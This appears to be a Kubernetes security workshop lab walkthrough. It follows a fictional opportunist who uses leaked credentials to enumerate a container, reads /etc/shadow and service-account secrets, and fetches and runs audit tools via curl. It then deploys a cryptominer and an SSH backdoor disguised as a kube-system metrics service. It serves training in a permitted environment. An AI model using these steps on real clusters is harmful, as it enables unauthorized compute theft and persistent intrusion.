# Free Compute: Scenario 1 Attack

## Warning

In these Attack scenarios, we're going to be doing a lot of things that can be crimes if done without permission. Today, you have permission to perform these kinds of attacks against your assigned training environment.

In the real world, use good judgment. Don't hurt people, don't get yourself in trouble. Only perform security assessments against your own systems, or with written permission from the owners.

## Backstory

### Name: __Red__

* Opportunist
* Easy money via crypto-mining
* Uses automated scans of web IP space looking for known exploits and vulnerabilities

### Motivations

* __Red__ has been mining `bitcoinero` for a few months now, and it's starting to gain some value
* __Red__ is looking for free-to-them compute on which to run miners
* __Red__ purchased some leaked credentials from the dark web

## Thinking In Graphs

Attacking a system is a problem-solving process similar to troubleshooting: __Red__ begins with a goal (deploy an unauthorized cryptominer) but doesn't really know what resources are available to achieve that goal. They will have to start with what little they already know, perform tests to learn more, and develop a plan. The plan is ever-evolving as new information is gleaned.

The general process looks like this:

![attack lifecycle](img/attack-lifecycle.png)

* __Study__

    In this phase, use enumeration tools to start from the information you have, and get more information. Which tools to use will depend on the situation. For example, `nmap` is commonly used to enumerate IP networks. `nikto`, `burp`, and `sqlmap` are interesting ways to learn more about web applications. Windows and Linux administrative utilities such as `uname`, `winver`, and `netstat` provide a wealth of information about their host OSes.

* __Plan__

    In this phase, think about everything you currently know, and what actions you can take based on that knowledge. If you think you can do something that will help you get closer to your goal, move onto Attack. Otherwise, go back to Study and try to learn more.

* __Attack Something__

    In this phase, you take some action in the hope of getting closer to your goal. This may be running an exploit tool against a buggy piece of software, launching some kind of credential-guessing utility, or even just running a system command like kubectl apply. Your success or failure will teach you more about your target and situation. Move on to Study, Persist, or Win, as appropriate.

* __Persist__

    In this optional phase, you take some action to make it easier to re-enter the system or network at a later time. Common options are running a malware Remote Access Tool such as Meterpreter, creating new accounts for later use, and stealing passwords.

* __Win__

    Eventually, you may achieve your goals. Congratulations! Now you can stop hacking and begin dreaming about your next goal.

## Initial Access

__Red__ purchased a bundle of leaked credentials online. One set of credentials appears to be for a publicly accessible kubernetes cluster. They've downloaded the creds and want to connect to the cluster to see what's available.

```console
id
```
```console
uname -a
```
```console
cat /etc/lsb-release /etc/redhat-release
```
```console
ps -ef
```
```console
df -h
```
```console
netstat -nl
```

Note that the kernel version doesn't match up to the reported OS, and there are very few processes running. This is probably a container.

Let's do some basic checking to see if we can get away with shenanigans. Look around the filesystem. Try downloading and running <a href="http://pentestmonkey.net/tools/audit/unix-privesc-check" target="_blank">a basic Linux config auditor</a> to see if it finds any obvious opportunities. Search a bit on https://www.exploit-db.com/ to see if there's easy public exploits for the kernel.

```console
cat /etc/shadow
```
```console
ls -l /home
```
```console
ls -l /root
```
```console
cd /tmp; curl https://pentestmonkey.net/tools/unix-privesc-check/unix-privesc-check-1.4.tar.gz | tar -xzvf -; unix-privesc-check-1.4/unix-privesc-check standard
```

That's not getting us anywhere. Let's follow-up on that idea that it's maybe a container:

```console
cd /tmp; curl -L -o amicontained https://github.com/genuinetools/amicontained/releases/download/v0.4.7/amicontained-linux-amd64; chmod 555 amicontained; ./amicontained
```

This tells us several things:

* We are in a container, and it's managed by Kubernetes
* Some security features are not in use (userns)
* Seccomp is disabled, but a number of Syscalls are blocked
* We don't have any exciting capabilities. <a href="http://man7.org/linux/man-pages/man7/capabilities.7.html" target="_blank">Click for more capabilities info.</a>

Now let's inspect our Kubernetes environment:

```console
env | grep -i kube
```
```console
ls /var/run/secrets/kubernetes.io/serviceaccount
```

We have typical Kubernetes-related environment variables defined, and we have anonymous access to some parts of the Kubernetes API. We can see that the Kubernetes version is modern and supported -- but there's still hope if the Kubernetes security configuration is sloppy. Let's check for that next:

```console
export PATH=/tmp:$PATH
cd /tmp; curl -LO https://dl.k8s.io/release/v1.28.10/bin/linux/amd64/kubectl; chmod 555 kubectl
```
```console
kubectl get all
```
What workloads are deployed in all of the namespaces?
```console
kubectl get all -A
```
What operations can I run on this cluster?
```console
kubectl auth can-i --list
```
Can I create pods?
```console
kubectl auth can-i create pods
```

It looks like we have hit the jackpot! Let's see if we can start mining some crypto.
```console
cat > bitcoinero.yml <<EOF
apiVersion: apps/v1
kind: Deployment
metadata:
  labels:
    run: bitcoinero
  name: bitcoinero
  namespace: dev
spec:
  replicas: 1
  revisionHistoryLimit: 2
  selector:
    matchLabels:
      run: bitcoinero
  strategy:
    rollingUpdate:
      maxSurge: 25%
      maxUnavailable: 25%
    type: RollingUpdate
  template:
    metadata:
      labels:
        run: bitcoinero
    spec:
      containers:
      - image: securekubernetes/bitcoinero:latest
        name: bitcoinero
        command: ["./moneymoneymoney"]
        args:
        - -c
        - "1"
        - -l
        - "10"
        resources:
          requests:
            cpu: 100m
            memory: 128Mi
          limits:
            cpu: 200m
            memory: 128Mi 
EOF

kubectl apply -f bitcoinero.yml
sleep 10
kubectl get pods
```

We can see the bitcoinero pod running, starting to generate a small but steady stream of cryptocurrency. But we need to take a few more steps to protect our access to this lucrative opportunity. Let's deploy an SSH server on the cluster to give us a backdoor in case we lose our current access later.

```console
kubectl apply -n kube-system -f backdoor.yaml
sleep 10
echo "Save this IP for Attack Scenario #2"
kubectl get svc metrics-server-service -n kube-system -o table -o jsonpath='{.status.loadBalancer.ingress[0].ip}'
```
